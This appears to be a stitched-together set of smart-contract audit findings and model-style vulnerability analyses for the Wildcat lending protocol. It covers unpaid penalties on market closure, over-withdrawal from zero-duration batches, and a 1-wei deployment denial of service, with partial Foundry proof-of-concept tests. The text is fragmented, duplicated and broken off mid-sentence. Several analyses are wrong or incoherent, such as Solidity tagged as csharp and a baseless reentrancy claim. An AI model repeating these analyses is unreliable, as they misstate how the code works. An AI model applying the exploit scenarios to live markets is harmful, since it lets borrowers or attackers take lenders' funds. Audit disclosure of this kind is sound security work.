dedicated to the last lender are already transferred to the previous lenders as the penalty fee.\n    \n\nThe borrower might intentionally do it to escape from the penalty, or the borrower may not even be aware of the situation.\n\n1. The borrower had a cash flow problem after taking the debt\n    \n2. The market stayed delinquent for a long time\n    \n3. The borrower found some funds\n    \n4. The borrower wanted to close the high-interest debts right after finding some funds\n    \n5. Immediately paid everything and closed the market while the market was still delinquent.\n    \n6. From the borrower's perspective, they paid all of their debt while closing the market.\n\n7. But in reality, the borrower only paid the half of the penalty fee (while the counter was counting up). But the second half of the penalties, which will be accumulated while the counter was counting down, is not paid by the borrower. \n    \nThe protocol does not check if there are remaining penalties, and doesn't charge the borrower enough while closing the market.\n \nI provided a coded PoC below that shows every step of the vulnerability.\n\n## Impact\n- The borrower will pay only half of the penalty while closing the market. \n- The other half of the penalty will keep accumulating.\n- One of the lenders (the last one to withdraw) will have to cover those unpaid penalties.\n\nBorrowers who are aware of this may create charming markets with lower base rate but higher penalty rate (They know they won't pay the half of it). \nOr the borrowers may not be aware of this, but the protocol doesn't take the required penalty from them. They \"unintentionally\" not pay the penalty, but the lender will have to cover it. \n\n## Proof of Concept\n### Coded PoC\n\nYou can use the protocol's own test setup to prove this issue.  \n\\- Copy the snippet below, and paste it into the `WildcatMarket.t.sol` test file.  \n\\- Run it with `forge test --match-test test_closeMarket_withoutPaying_HalfofThePenalty -vvv`\n\n```solidity\n// @audit Not pay the half, leave it to the last lender\n  function test_closeMarket_withoutPaying_HalfofThePenalty() external {\n    // -----------------------------------------CHAPTER ONE - PREPARE--------------------------------------------------------------------------------\n    // ------------------------------DEPOSIT - BORROW - WITHDRAW -> MARKET IS DELINQUENT-------------------------------------------------------------\n\n    // Alice and Bob deposit 50k each, borrower borrows 80% \n    _authorizeLender(bob);\n    vm.prank(alice);\n    market.depositUpTo(50_000e18);\n    vm.prank(bob);\n    market.depositUpTo(50_000e18);\n    vm.prank(borrower);\n    market.borrow(80_000e18);\n    \n    // Alice and Bob request withdrawal for 10k each, reserve will be 0, market will be delinquent.\n    vm.prank(alice);\n    market.queueWithdrawal(10_000e18);\n    vm.prank(bob);\n    market.queueWithdrawal(10_000e18);\n    // skip withdrawal batch duration\n    skip(1 days);\n    market.executeWithdrawal(alice, 86401); //86401 is the batch expiry.

This can easily be done by checking `state.timeDelinquent` in the `closeMarket()` function.\n\nThat one is simple, but I don't think it is fair for the borrower because the borrower will have to pay the base rate too for that additional amount of time. Maybe the borrower will be inclined to pay the `current debt + future penalties` and close the market as soon as possible.\n\nThat's why I think closing the market can still be allowed even if there are penalties to accumulate. However, the problem with that one is we can not know the exact amount of future penalties due to the compounding mechanism. It will depend on how many times the state is updated while the grace counter counts down.\n\nTherefore I believe a buffer amount should be added. If the borrowers want to close the market, they should pay `current debt + expected future penalties + buffer amount`, and the excess amount from the buffer should be transferred back to the borrower after every lender withdraws their funds.\n\n\n\n\n\n## Assessed type\n\nContext",

The vulnerability arises from the fact that the `closeMarket()` function allows any external account with a balance in the market's asset contract to call it and close the market. However, the function does not properly verify that the caller is authorized to perform this action, and instead relies solely on permissions granted at a higher level (e.g., the `onlyController` modifier).\n\nThis means that an attacker who has a balance in the asset contract can call the `closeMarket()` function without proper authorization, potentially causing undesired changes to the market's state. For example, the attacker could use this vulnerability to transfer excess assets from the borrower to themselves or to trigger a withdrawal of unpaid interest from the borrower.\n\nTo address this vulnerability, the `closeMarket()` function should be modified to include additional authorization checks, such as verifying that the caller is indeed the owner of the asset contract or has been explicitly granted permission by the controller.

        "gtraw": "\n# Vulnerability details\n\nTo explain this issue, I will need to mention two things: the fee structure of the protocol and how closing a market works. Let's start with the fees.\n\nLenders earn interest with two different types of fees: Base interest and delinquency fee. The base interest depends on the annual interest rate of the market and it is paid by the borrower no matter what. On the other hand, the delinquency fee is a penalty fee and it is paid by the borrower if the reserves of the market drop below the required reserves amount.\n\nThe important part is how the penalty fees are calculated and I'll be focusing on penalty fees at the moment.  \nEvery market has a delinquency grace period, which is a period that is not penalized. If a market is delinquent but the grace period is not passed yet, there is no penalty fee. After the grace period is passed, the penalty fee is applied.\n\nThe most crucial part starts now: The penalty fee does not become 0 immediately after the delinquency is cured. The penalty fee is still being applied even after the delinquency is cured until the grace tracker counts down to zero.\n\nAn example from the protocol [gitbook/borrowers section is](https://wildcat-protocol.gitbook.io/wildcat/using-wildcat/day-to-day-usage/borrowers): *\"Note: this means that if a markets grace period is 3 days, and it takes 5 days to cure delinquency, this means that* ***4*** *days of penalty APR are paid.\"*\n\nHere you can find the code snippet of penalty fee calculation:  \n\n\n---\n\nNow, let's check how to close a market and here is the `closeMarket()` function:\n\n```solidity\nfile: WildcatMarket.sol\n142.  function closeMarket() external onlyController nonReentrant {\n143.    MarketState memory state = _getUpdatedState();\n144.    state.annualInterestBips = 0;\n145.    state.isClosed = true;\n146.    state.reserveRatioBips = 0;\n147.    if (_withdrawalData.unpaidBatches.length() > 0) {\n148.      revert CloseMarketWithUnpaidWithdrawals();\n149.    }\n150.    uint256 currentlyHeld = totalAssets();\n151.@>  uint256 totalDebts = state.totalDebts(); //@audit-issue Current debt is calculated with the current scaleFactor. It doesn't check if there are remaining \"state.timeDelinquent\" to pay penalty fees. \n152.    if (currentlyHeld < totalDebts) {\n153.      // Transfer remaining debts from borrower\n154.@>    asset.safeTransferFrom(borrower, address(this), totalDebts - currentlyHeld); //@audit remaining debt is transferred and market is closed, but if the market was delinquent for a while, debt will keep increasing. Total assets will not cover the total debt\n155.    } else if (currentlyHeld > totalDebts) {\n156.      // Transfer excess assets to borrower\n157.      asset.safeTransfer(borrower, currentlyHeld - totalDebts);\n158.    }\n159.    _writeState(state);\n160.    emit MarketClosed(block.timestamp);\n161.  }\n```\n\n\n\nWhile closing the market, the total debt is calculated and the required amount is transferred to the market. This way all debts are covered. However, the covered total debt is calculated with the current scale factor. As you can see above, this function does not check if there are still penalties to be paid. It should have checked the `state.timeDelinquent`.\n\nIf the `state.timeDelinquent > grace period` when closing the market *(which means the borrower still has more penalties to pay)*, the scale factor will keep increasing after every state update.\n\nThe borrower didn't pay the remaining penalties when closing the market, but who will pay it?\n\n* Lenders will keep earning those penalty fees (*the base rate will be 0 after closing, but the penalty fee will still accumulate*)\n    \n* Lenders will start withdrawing their funds.\n    \n* All lenders except the last one will withdraw `the exact debt to the lender when closed + the penalty fee after closing`.\n    \n* The last lender will not even be able to withdraw `the exact debt to the lender when closed` because some portion of the funds dedicated to the last lender are already transferred to the previous lenders as the penalty fee.\n    \n\nThe borrower might intentionally do it to escape from the penalty, or the borrower may not even be aware of the situation.\n\n1. The borrower had a cash flow problem after taking the debt\n    \n2. The market stayed delinquent for a long time\n    \n3. The borrower found some funds\n    \n4. The borrower wanted to close the high-interest debts right after finding some funds\n    \n5. Immediately paid everything and closed the market while the market was still delinquent.\n    \n6. From the borrower's perspective, they paid all of their debt while closing the market.\n\n7. But in reality, the borrower only paid the half of the penalty fee (while the counter was counting up). But the second half of the penalties, which will be accumulated while the counter was counting down, is not paid by the borrower. \n    \nThe protocol does not check if there are remaining penalties, and doesn't charge the borrower enough while closing the market.\n \nI provided a coded PoC below that shows every step of the vulnerability.\n\n## Impact\n- The borrower will pay only half of the penalty while closing the market. \n- The other half of the penalty will keep accumulating.\n- One of the lenders (the last one to withdraw) will have to cover those unpaid penalties.\n\nBorrowers who are aware of this may create charming markets with lower base rate but higher penalty rate (They know they won't pay the half of it). \nOr the borrowers may not be aware of this, but the protocol doesn't take the required penalty from them. They \"unintentionally\" not pay the penalty, but the lender will have to cover it. \n\n## Proof of Concept\n### Coded PoC\n\nYou can use the protocol's own test setup to prove this issue.  \n\\- Copy the snippet below, and paste it into the `WildcatMarket.t.sol` test file.  \n\\- Run it with `forge test --match-test test_closeMarket_withoutPaying_HalfofThePenalty -vvv`\n\n```solidity\n// @audit Not pay the half, leave it to the last lender\n  function test_closeMarket_withoutPaying_HalfofThePenalty() external {\n    // -----------------------------------------CHAPTER ONE - PREPARE--------------------------------------------------------------------------------\n    // ------------------------------DEPOSIT - BORROW - WITHDRAW -> MARKET IS DELINQUENT-------------------------------------------------------------\n\n    // Alice and Bob deposit 50k each, borrower borrows 80% \n    _authorizeLender(bob);\n    vm.prank(alice);\n    market.depositUpTo(50_000e18);\n    vm.prank(bob);\n    market.depositUpTo(50_000e18);\n    vm.prank(borrower);\n    market.borrow(80_000e18);\n    \n    // Alice and Bob request withdrawal for 10k each, reserve will be 0, market will be delinquent.\n    vm.prank(alice);\n    market.queueWithdrawal(10_000e18);\n    vm.prank(bob);\n    market.queueWithdrawal(10_000e18);\n    // skip withdrawal batch duration\n    skip(1 days);\n    market.executeWithdrawal(alice, 86401); //86401 is the batch expiry.

This can easily be done by checking `state.timeDelinquent` in the `closeMarket()` function.\n\nThat one is simple, but I don't think it is fair for the borrower because the borrower will have to pay the base rate too for that additional amount of time. Maybe the borrower will be inclined to pay the `current debt + future penalties` and close the market as soon as possible.\n\nThat's why I think closing the market can still be allowed even if there are penalties to accumulate. However, the problem with that one is we can not know the exact amount of future penalties due to the compounding mechanism. It will depend on how many times the state is updated while the grace counter counts down.\n\nTherefore I believe a buffer amount should be added. If the borrowers want to close the market, they should pay `current debt + expected future penalties + buffer amount`, and the excess amount from the buffer should be transferred back to the borrower after every lender withdraws their funds.\n\n\n\n\n\n## Assessed type\n\nContext",

This occurs when the amount of asset to be withdrawn is mistakenly calculated using a denomination different from the intended one. In this case, the amount is calculated in borrowAsset denomination but is later treated as the share amount to be withdrawn. It can lead to incorrect calculations and withdrawals.\n\nThe vulnerability lies in the following lines of code:\n```csharp\nuint256 currentlyHeld = totalAssets();\n```\nHere, the function `totalAssets()` returns the total asset balance held by the contract, which is in borrowAsset denomination. However, later on in the code, this value is used as if it were the share amount to be withdrawn:\n```csharp\nasset.safeTransfer(borrower, currentlyHeld - totalDebts);\n```\nIf the asset balance held by the contract is not in the correct denomination (i.e., if it is not in the same denomination as the share amount to be withdrawn), this can lead to incorrect calculations and withdrawals. For example, if the asset balance is $100 but the share amount to be withdrawn is $1000, then transferring $900 from the contract to the borrower would result in a loss of $800 for the borrower due to the incorrect denomination.\n\nTo mitigate this vulnerability, ensure that the correct denomination is used while calculating the amount, and have proper validations and conditions in place to detect and prevent this error.",

The function `closeMarket` is marked as external and only accessible by the controller. This ensures that only authorized users can execute this function, which helps to mitigate potential security risks.\n2. The function first retrieves an updated state of the market using `_getUpdatedState()`, which seems to be a private function that returns a `MarketState` object. However, there is no information provided about what this function does or how it works, so we cannot determine if it checks for credit line existence.\n3. The function then sets several properties of the `MarketState` object to zero, including `annualInterestBips`, `isClosed`, and `reserveRatioBips`. This could potentially lead to a vulnerability if these properties are not properly validated, but without more information about their meaning and purpose, it is difficult to determine if this is indeed the case.\n4. The function then checks if there are any unpaid withdrawals using `_withdrawalData.unpaidBatches.length()` and reverts the transaction if there are any unpaid withdrawals. This seems like a reasonable approach to ensure that the lender cannot close a credit line while there are still outstanding debts.\n5. The function then checks the difference between the total assets held by the lender and the total debts owed by the borrower, and transfers any excess assets or debts as necessary using `safeTransfer` functions.

Alice calls `setMaxTotalSupply` with a new maximum total supply that is less than the current total supply.\n2. The smart contract updates the maximum total supply value and emits an event indicating that it has been updated.\n3.

Incorrect usage of SafeMath library: The code uses the SafeMath library to perform safe arithmetic operations, but it does not use it correctly. For example, in the \"setMaxTotalSupply\" function, the code subtracts the current total supply from the new maximum total supply without using the \"sub\" method provided by the SafeMath library. This could lead to an underflow error if the new maximum total supply is smaller than the current total supply.\n2. Lack of proper balance handling: The code does not properly handle balances in the smart contract. For example, in the \"setMaxTotalSupply\" function, the code sets the \"maxTotalSupply\" variable to a new value without updating the balance of the strategy or vault. This could lead to funds being locked in the strategy or vault if the new maximum total supply is smaller than the current total supply.\n3. Incorrect error handling: The code does not handle errors correctly. For example, in the \"setMaxTotalSupply\" function, the code reverts with a custom error message without providing any context about the error.

The function then updates the `maxTotalSupply` field of the MarketState with the new value, but does not check whether the current balance exceeds the new limit.\n\nHowever, upon further review of the code, I noticed that the `_getUpdatedState()` function is called to retrieve the updated state after setting the new maximum total supply. This function retrieves the current MarketState and updates its `totalSupply` field with the current balance of the contract. Therefore, the updated `maxTotalSupply` will be based on the current balance, which should prevent fund locking issues.\n\nIn summary, while the code does not handle balances correctly, it takes steps to ensure that the new maximum total supply is based on the correct balance and should prevent fund locking issues.

Withdrawal requests that could not be fully honored at the end of their withdrawal cycle are batched together, marked as expired withdrawals, and added to the withdrawal queue. These batches are tracked using the time of expiry, and when assets are returned to a market with a non-zero withdrawal queue, assets are immediately routed to the unclaimed withdrawals pool and can subsequently be claimed by lenders with the oldest expired withdrawals first.\n\nThe **withdrawalBatchDuration** can be set to zero so lenders do not have to wait before being able to withdraw funds from the market; however, this can cause issues where lenders in a batch can withdraw more than their pro-rata share of the batch's paid assets.\n\nA lender calls **queueWithdrawal** first to initiate the withdrawal; this will place it in a batch respective to its expiry.\n```solidity\nfunction queueWithdrawal(uint256 amount) external nonReentrant {\n        MarketState memory state = _getUpdatedState();\n\n        ...\n\n        // If there is no pending withdrawal batch, create a new one.\n        if (state.pendingWithdrawalExpiry == 0) {\n            state.pendingWithdrawalExpiry = uint32(block.timestamp + withdrawalBatchDuration);\n            emit WithdrawalBatchCreated(state.pendingWithdrawalExpiry);\n        }\n        // Cache batch expiry on the stack for gas savings.\n        uint32 expiry = state.pendingWithdrawalExpiry;\n\n        WithdrawalBatch memory batch = _withdrawalData.batches[expiry];\n\n        // Add scaled withdrawal amount to account withdrawal status, withdrawal batch and market state.\n        _withdrawalData.accountStatuses[expiry][msg.sender].scaledAmount += scaledAmount;\n        batch.scaledTotalAmount += scaledAmount;\n        state.scaledPendingWithdrawals += scaledAmount;\n\n        emit WithdrawalQueued(expiry, msg.sender, scaledAmount);\n\n        // Burn as much of the withdrawal batch as possible with available liquidity.\n        uint256 availableLiquidity = batch.availableLiquidityForPendingBatch(state, totalAssets());\n        if (availableLiquidity > 0) {\n            _applyWithdrawalBatchPayment(batch, state, expiry, availableLiquidity);\n        }\n\n        // Update stored batch data\n        _withdrawalData.batches[expiry] = batch;\n\n        // Update stored state\n        _writeState(state);\n    }\n```\n\nNow once the **withdrawalBatchDuration** has passed, a lender can call **executeWithdrawal** to finalize the withdrawal. This will grab the batch and let the lender withdraw a percentage of the batch if the batch is not fully paid or all funds if it is fully paid.\n\n```solidity\nfunction executeWithdrawal(address accountAddress, uint32 expiry) external nonReentrant returns (uint256) {\n        if (expiry > block.timestamp) {\n            revert WithdrawalBatchNotExpired();\n        }\n        MarketState memory state = _getUpdatedState();\n\n        WithdrawalBatch memory batch = _withdrawalData.batches[expiry];\n        AccountWithdrawalStatus storage status = _withdrawalData.accountStatuses[expiry][accountAddress];\n\n        uint128 newTotalWithdrawn =\n            uint128(MathUtils.mulDiv(batch.normalizedAmountPaid, status.scaledAmount, batch.scaledTotalAmount));\n        uint128 normalizedAmountWithdrawn = newTotalWithdrawn - status.normalizedAmountWithdrawn;\n        status.normalizedAmountWithdrawn = newTotalWithdrawn;\n        state.normalizedUnclaimedWithdrawals -= normalizedAmountWithdrawn;\n\n        ...\n\n        // Update stored state\n        _writeState(state);\n\n        return normalizedAmountWithdrawn;\n    }\n```\n\nLet's look at how this percentage is determined: the **newTotalWithdrawn** function determines a lender's available withdrawal amount by multiplying the **normalizedAmountPaid** with the **scaledAmount** and dividing the result by the batch's **scaledTotalAmount**. This ensures that each lender in the batch can withdraw an even amount of the available funds in the batch depending on their **scaledAmount**.\n\n```solidity\n uint128 newTotalWithdrawn =\n            uint128(MathUtils.mulDiv(batch.normalizedAmountPaid, status.scaledAmount, batch.scaledTotalAmount));\n```\n\nThis works fine when **withdrawalBatchDuration** is set over zero, as the batch values (except **normalizedAmountPaid**) are finalized. However, when set to zero, we can end up with lenders in a batch being able to withdraw more than **normalizedAmountPaid** in that batch, potentially violating protocol invariants.\n\nConsider the following scenario:\n\nThere is only 5 tokens available to burn\n\nLender A calls **queueWithdrawal** with 5 and **executeWithdrawal** instantly.\n    \n    newTotalWithdrawn = (normalizedAmountPaid) * (scaledAmount) / scaledTotalAmount\n    \n    newTotalWithdrawn = 5 * 5 = 25 / 5 = 5\n    \nLender A was able to fully withdraw.\n\nLender B comes along and calls **queueWithdrawal** with 5 and **executeWithdrawal** instantly in the same block.\n    \nThis will add to the same batch as lender A as it is the same expiry.\n    \nNow let's look at **newTotalWithdrawn** for Lender B.\n    \n    newTotalWithdrawn = (normalizedAmountPaid) * (scaledAmount) / scaledTotalAmount\n    \n    newTotalWithdrawn = 5 * 5 = 25 / 10 = 2.5\n    \nLets see what the batch looks like now\n  \n  - Lender A was able to withdraw 5 tokens in the batch\n\n  - Lender B was able to withdraw 2.5 tokens in the batch\n  \n  - The **batch.normalizedAmountPaid** is 5, meaning the Lenders' withdrawal amount surpassed the batch's current limit.\n\n## **Impact:**\n\nThis will break the following invariant in the protocol:\n\n\u201c**Withdrawal execution can only transfer assets that have been counted as paid assets

The reason for this vulnerability is that the withdrawal limit check is not performed consistently across all scenarios, particularly in the case of a whale user attempting to bypass the withdrawal limits.\n\nHere's why:\n\n1. The withdrawal limit check is only performed on the first request made during a given withdrawal batch. This means that if a whale user makes multiple requests within a short period, they can potentially bypass the withdrawal limits and withdraw more funds than allowed during the first request.\n2. The vulnerability arises due to the inconsistent use of `block.timestamp` in the smart contract code. In some cases, the time-based conditions are satisfied, but the limit checks are not performed consistently across all scenarios. This can lead to a situation where a whale user is able to bypass the withdrawal limits and empty the underlying contract reserves.\n3. To mitigate this vulnerability, it is recommended to add limit checks in the `if` blocks where the time-based conditions are satisfied, ensuring that the first request does not overflow the withdrawal limits in both global and user-specific scenarios.\n4.

The vulnerability arises from the use of nonReentrant modifier in the queueWithdrawal function, which prevents reentry into the same function. However, this modifier does not protect against other functions that call the queueWithdrawal function.\n\nThe reason for this is that the withdrawal batching mechanism is implemented using a single-entry single-exit (SESE) pattern. The queueWithdrawal function is called only once in the entire process of creating and burning a withdrawal batch, and it is not possible to call any other functions within the same transaction. Therefore, if an attacker were to send two or more transactions with the same message sender address, the second and subsequent transactions would be blocked by the nonReentrant modifier, even though they are legitimate requests.\n\nTo mitigate this vulnerability, I would recommend adding limit checks in the if blocks where the time-based conditions are satisfied to ensure that the first request does not overflow the withdrawal limits in both global and user-specific scenarios. This would help prevent the exploitation of a potential reentrancy attack by an attacker who sends multiple transactions with the same message sender address.\n\nIn summary, I believe that the given smart contract code is vulnerable to a type of attack known as \"reentrancy attack\" due to the use of nonReentrant modifier and the implementation of SESE pattern in withdrawal batching mechanism.

Withdrawal requests that could not be fully honored at the end of their withdrawal cycle are batched together, marked as expired withdrawals, and added to the withdrawal queue. These batches are tracked using the time of expiry, and when assets are returned to a market with a non-zero withdrawal queue, assets are immediately routed to the unclaimed withdrawals pool and can subsequently be claimed by lenders with the oldest expired withdrawals first.\n\nThe **withdrawalBatchDuration** can be set to zero so lenders do not have to wait before being able to withdraw funds from the market; however, this can cause issues where lenders in a batch can withdraw more than their pro-rata share of the batch's paid assets.\n\nA lender calls **queueWithdrawal** first to initiate the withdrawal; this will place it in a batch respective to its expiry.\n```solidity\nfunction queueWithdrawal(uint256 amount) external nonReentrant {\n        MarketState memory state = _getUpdatedState();\n\n        ...\n\n        // If there is no pending withdrawal batch, create a new one.\n        if (state.pendingWithdrawalExpiry == 0) {\n            state.pendingWithdrawalExpiry = uint32(block.timestamp + withdrawalBatchDuration);\n            emit WithdrawalBatchCreated(state.pendingWithdrawalExpiry);\n        }\n        // Cache batch expiry on the stack for gas savings.\n        uint32 expiry = state.pendingWithdrawalExpiry;\n\n        WithdrawalBatch memory batch = _withdrawalData.batches[expiry];\n\n        // Add scaled withdrawal amount to account withdrawal status, withdrawal batch and market state.\n        _withdrawalData.accountStatuses[expiry][msg.sender].scaledAmount += scaledAmount;\n        batch.scaledTotalAmount += scaledAmount;\n        state.scaledPendingWithdrawals += scaledAmount;\n\n        emit WithdrawalQueued(expiry, msg.sender, scaledAmount);\n\n        // Burn as much of the withdrawal batch as possible with available liquidity.\n        uint256 availableLiquidity = batch.availableLiquidityForPendingBatch(state, totalAssets());\n        if (availableLiquidity > 0) {\n            _applyWithdrawalBatchPayment(batch, state, expiry, availableLiquidity);\n        }\n\n        // Update stored batch data\n        _withdrawalData.batches[expiry] = batch;\n\n        // Update stored state\n        _writeState(state);\n    }\n```\n\nNow once the **withdrawalBatchDuration** has passed, a lender can call **executeWithdrawal** to finalize the withdrawal. This will grab the batch and let the lender withdraw a percentage of the batch if the batch is not fully paid or all funds if it is fully paid.\n\n```solidity\nfunction executeWithdrawal(address accountAddress, uint32 expiry) external nonReentrant returns (uint256) {\n        if (expiry > block.timestamp) {\n            revert WithdrawalBatchNotExpired();\n        }\n        MarketState memory state = _getUpdatedState();\n\n        WithdrawalBatch memory batch = _withdrawalData.batches[expiry];\n        AccountWithdrawalStatus storage status = _withdrawalData.accountStatuses[expiry][accountAddress];\n\n        uint128 newTotalWithdrawn =\n            uint128(MathUtils.mulDiv(batch.normalizedAmountPaid, status.scaledAmount, batch.scaledTotalAmount));\n        uint128 normalizedAmountWithdrawn = newTotalWithdrawn - status.normalizedAmountWithdrawn;\n        status.normalizedAmountWithdrawn = newTotalWithdrawn;\n        state.normalizedUnclaimedWithdrawals -= normalizedAmountWithdrawn;\n\n        ...\n\n        // Update stored state\n        _writeState(state);\n\n        return normalizedAmountWithdrawn;\n    }\n```\n\nLet's look at how this percentage is determined: the **newTotalWithdrawn** function determines a lender's available withdrawal amount by multiplying the **normalizedAmountPaid** with the **scaledAmount** and dividing the result by the batch's **scaledTotalAmount**. This ensures that each lender in the batch can withdraw an even amount of the available funds in the batch depending on their **scaledAmount**.\n\n```solidity\n uint128 newTotalWithdrawn =\n            uint128(MathUtils.mulDiv(batch.normalizedAmountPaid, status.scaledAmount, batch.scaledTotalAmount));\n```\n\nThis works fine when **withdrawalBatchDuration** is set over zero, as the batch values (except **normalizedAmountPaid**) are finalized. However, when set to zero, we can end up with lenders in a batch being able to withdraw more than **normalizedAmountPaid** in that batch, potentially violating protocol invariants.\n\nConsider the following scenario:\n\nThere is only 5 tokens available to burn\n\nLender A calls **queueWithdrawal** with 5 and **executeWithdrawal** instantly.\n    \n    newTotalWithdrawn = (normalizedAmountPaid) * (scaledAmount) / scaledTotalAmount\n    \n    newTotalWithdrawn = 5 * 5 = 25 / 5 = 5\n    \nLender A was able to fully withdraw.\n\nLender B comes along and calls **queueWithdrawal** with 5 and **executeWithdrawal** instantly in the same block.\n    \nThis will add to the same batch as lender A as it is the same expiry.\n    \nNow let's look at **newTotalWithdrawn** for Lender B.\n    \n    newTotalWithdrawn = (normalizedAmountPaid) * (scaledAmount) / scaledTotalAmount\n    \n    newTotalWithdrawn = 5 * 5 = 25 / 10 = 2.5\n    \nLets see what the batch looks like now\n  \n  - Lender A was able to withdraw 5 tokens in the batch\n\n  - Lender B was able to withdraw 2.5 tokens in the batch\n  \n  - The **batch.normalizedAmountPaid** is 5, meaning the Lenders' withdrawal amount surpassed the batch's current limit.\n\n## **Impact:**\n\nThis will break the following invariant in the protocol:\n\n\u201c**Withdrawal execution can only transfer assets that have been counted as paid assets in the corresponding batch, i.e. lenders with withdrawal requests can not withdraw more than their pro-rata share of the batch's paid assets.\u201d**\n\nIt will also mean that funds reserved for other batches may not be able to be fulfilled even if the batch's **normalizedAmountPaid** number shows that it should be able to.\n\n## Proof Of Concept\n\nFor the following test, make sure you use the

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

The `executeWithdrawal` function takes two parameters: an `accountAddress` and a `expiry`. The function first checks if the `expiry` is greater than the current block timestamp. If it isn't, the function reverts with the error message \"WithdrawalBatchNotExpired\".\n2. The function then retrieves the `MarketState` object from storage using `_getUpdatedState()` and the `WithdrawalBatch` object for the given `expiry` using `_withdrawalData.batches[expiry]`. It also retrieves the `AccountWithdrawalStatus` object for the given `accountAddress` and `expiry`.\n3. The function calculates the new total withdrawn amount using the `normalizedAmountPaid`, `scaledAmount`, and `scaledTotalAmount` properties of the `WithdrawalBatch` object, as well as the `normalizedAmountWithdrawn` property of the `AccountWithdrawalStatus` object.\n4. The function updates the `normalizedAmountWithdrawn` property of the `AccountWithdrawalStatus` object to the new total withdrawn amount and subtracts the previous total withdrawn amount from the `normalizedUnclaimedWithdrawals` property of the `MarketState` object.\n5. The function then checks if the new total withdrawn amount is zero. If it is, the function reverts with the error message \"NullWithdrawalAmount\".\n6. The function then checks if the borrower is sanctioned using `IWildcatSanctionsSentinel`. If they are, the function creates an escrow and sends the withdrawal amount to the escrow. Otherwise, it transfers the withdrawal amount directly to the user's account address.\n7. The function emits an event indicating that the withdrawal has been executed and updates",

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

However, this smart contract code does not have any obvious weaknesses that could lead to such an attack.\n\nIn fact, the code appears to implement several safeguards against DoS attacks:\n\n1. The `expiry` parameter is checked before proceeding with the withdrawal request. This means that if a withdrawal request has expired (i.e., its expiration time has passed), it will be rejected and the user's funds will not be drained.\n2. The function includes a check for a zero or null withdrawal amount, which would cause the transaction to revert if the user attempts to withdraw a negative amount of tokens. This is likely intended to prevent users from accidentally sending too little money with their withdrawal request.\n3. The code also checks whether the account address is sanctioned by the `IWildcatSanctionsSentinel` contract, and if so, it blocks the account and sends the user's funds to an escrow contract instead of allowing them to be transferred directly to the user's wallet. This could help prevent DoS attacks by limiting the amount of gas fees that are used up by processing each withdrawal request.\n\nOverall, while there may be other potential vulnerabilities in this smart contract code, the given knowledge does not appear to apply to this specific implementation.",

However, this function only checks if the account is approved for the current epoch, and does not verify that the caller has been approved by the owner. Therefore, if two or more users trust each other and have approved each other for withdrawals, an attacker can observe the end of a specific epoch and initiate withdrawals in the last block, causing potential sabotage and preventing legitimate users from receiving payouts when they are on the winning side.\n\nTo fix this vulnerability, the approval requirement should be changed to check for the caller's authorization, rather than the receiver's, ensuring only valid users can initiate withdrawals.",

This allows an attacker to exploit the vulnerability by passing a malicious scale value that causes an underflow or overflow error in the multiplication operation, potentially leading to loss of funds for the user.\n\nThe reason for this vulnerability is that the hardcoded slippage control mechanism in the smart contract sets a tight slippage threshold that prevents users from withdrawing their funds when market conditions become volatile. However, this mechanism can be bypassed by exploiting the `mulDiv` function's vulnerability, as described above.\n\nTo mitigate this vulnerability, it is recommended to implement additional checks in the smart contract code to validate the scale value passed to the `mulDiv` function, and to ensure that the withdrawal amount is within a reasonable range to prevent underflow or overflow errors.

        "gt": "\n# Vulnerability details\n\n## Impact\n- Lenders can escape the sanctioning of their account in any market.\n\n## Proof of Concept\n- Before diving into the details of how the lenders can escape the sanctioning of their account.\n    - First, let's analyze how a lender can be excised from a Market \n        - When someone calls nukeFromOrbit within that market while flagged as sanctioned by the Chainanalysis oracle\n        - When the lender invokes executeWithdrawal while flagged as sanctioned by the Chainalysis oracle\n    - In either of the two options, the execution flow calls the [`Sentinel::isSanctioned()` function](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatSanctionsSentinel.sol#L39-L43) to verify if the account(lender) is sanctioned by the borrower of the market\n        - By analyzing the [`Sentinel::isSanctioned()` function](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatSanctionsSentinel.sol#L39-L43), it can be noted that the lender's account must have been sanctioned in the Oracle first before the account is finally sanction in a Market\n\n> WildcatSanctionsSentinel.sol\n```solidity\n  function isSanctioned(address borrower, address account) public view override returns (bool) {\n    //@audit-info => sanctionOverrides[borrower][account] must be false <==> sanction must not be overridden for this function to return true!\n    //@audit-info => If sanctionOverrides[borrower][account] is set to true, this function will return false, as if the account would not be sanctioned\n\n    //@audit-info => For this function to return true, the account's sanction should have not been overridden (it's set to false), and the account must have been sanctioned in the ChainalysisSanctionsList Oracle.\n    return\n      !sanctionOverrides[borrower][account] 